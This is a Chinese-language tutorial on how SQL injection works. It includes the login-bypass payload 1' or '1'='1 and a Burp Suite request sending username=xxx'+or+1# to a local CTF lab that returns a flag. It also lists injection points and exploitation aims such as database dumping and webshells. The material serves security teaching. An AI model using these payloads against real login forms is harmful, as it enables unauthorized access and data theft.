# ==WEB SQL注入漏洞原理与利用==

## SQL注入原理深入解析

SQL注入产生原理

**动态交互网站，实现交互，利用用户输入拼接到SQL执行，输入不同导致返回结果不同。用户输入内容没有经过完美处理，而且构造SQL语句，直接将构造的SQL语句带入SQL语句中执行，导致SQL注入漏洞**

```sql
登录功能模块:实现用户身份认证

用户输入: 用户名和密码
SQL语句拼接: select * from admin where username ='用户提交’and password ='用户提交'

正常情况下，where条件语句当用户提交数据在数据库中存在才返回真，不存在返回假，可以完成用户身份认证。

但是如果恶意用户输入一段精心构造的SQL语句，使得输入部分也被识别为SQL语句，那么此时就会造成SQL注入漏洞。
```



```sql
 案例: 万能密码
 SQL语句拼接: select * from admin where username ='用户提交’and password ='用户提交'
 
 用户输入:密码位置 1' or '1'= '1
 SOL语句拼接:
 select * from admin where username ='用户提交' and password ='1' or '1' = '1'
 
 此时where条件语句中的内容等价于 1 (真) SQL语句执行结果为 返回所有数据，达到绕过登录认证机制。
```



实验：

Burpsuite进行万能密码测试 

环境: PHP+Mysql

注意: Burpsuite Repeater模块中 空格使用加号+或%20替代。

```http
POST /01SQL/01Login/flag.php HTTP/1.1
Host: 127.0.0.1:0000
User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebkit/540.0 (KHTML, like Gecko)
Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0
Accept: text/html,application/xhtml+xml,application/xml;g=0.9,image/webp,*/*;g=0.8
Accept-Language: zh-CN,zh;g=0.8,zh-TW;g=0.7,zh-HK;g=0.5,en-US;g=0.3, en;g=0.2
Accept-Encoding: gzip，deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: http://127.0.0.1:8080
Connection: close
Referer: http://127.0.0.1:8080/01SQL/01Login/login.php
Upgrade-Insecure-Requests: 1
username=xxx'+or+1#&password=password
```

**SOL语句: select * from admin where username = 'xxx'+or+1 #and password = 'password**';

这里的+表示空格

操作如下

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230826230013746.png" alt="image-20230826230013746" style="zoom:200%;" />

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230826230046766.png" alt="image-20230826230046766" style="zoom:200%;" />

```http
HTTP/1.1 209 OK
Date: Mon， 11 May 2020 12 :09:53 GMT
Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2 .3.9
X-Powered-By: PHP/5.3.29
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 46

flag{9bc62cb833726d44790348b0e9cbd8a}
```



## SQL注入类型分类

**SQL语句中用户输入的数据无非只有两种，一种数字，另外一种字符**

```SQL
数字型注入:
select * from articles where id = 1
select * from aritcles where id = (1)

字符型注入:逃逸引号，闭合引号
select * from articles where id = '1'
select * from articles where id = "1"
select * from articles where id = ('1') 
```

注意: SQL语句中的 () 不代表实际含义，只作为一个分组处理。



## SQL注入可能位置

SQL注入漏洞出现的位置存在于用户可控输入范围，用户输入的位置由以下内容组成：

**1、URL提交的参数
2、HTTP请求主体 (POST提交的数据)
3、HTTP请求头 (User-Agent、 Referer、 Cookie等)**

以上输入位置只要提交的数据 未完美处理 被带入到SQL执行，就存在SQL注入漏洞.



## SQL注入利用方式

验证SQL注入漏洞存在后，可以进行利用SQL注入漏洞做以下操作:

**1.获取数据库信息 (脱裤)
2.获取系统命令执行shell
3.上传、下载服务器文件 (webshell) 等**



对于SQL注入漏洞的利用技术可以大致分为以下四类：

**1、联合注入
2、布尔盲注
3、延时盲注
4、报错注入**



如果想要深入掌握SOL注入并解决CTF题目，必须精通四种注入利用技术。

**总结:
1.SQL注入为什么会产生? (SQL语句拼接)
2.SQL注入类型分类有哪些? (数字和字符)
3.SOL注入可能出现的位置在哪里? (HTTP请求中的任意位置)
4.SQL注入利用的方式有那些? (联合查询、布尔盲注、延时盲注、报错注入)**



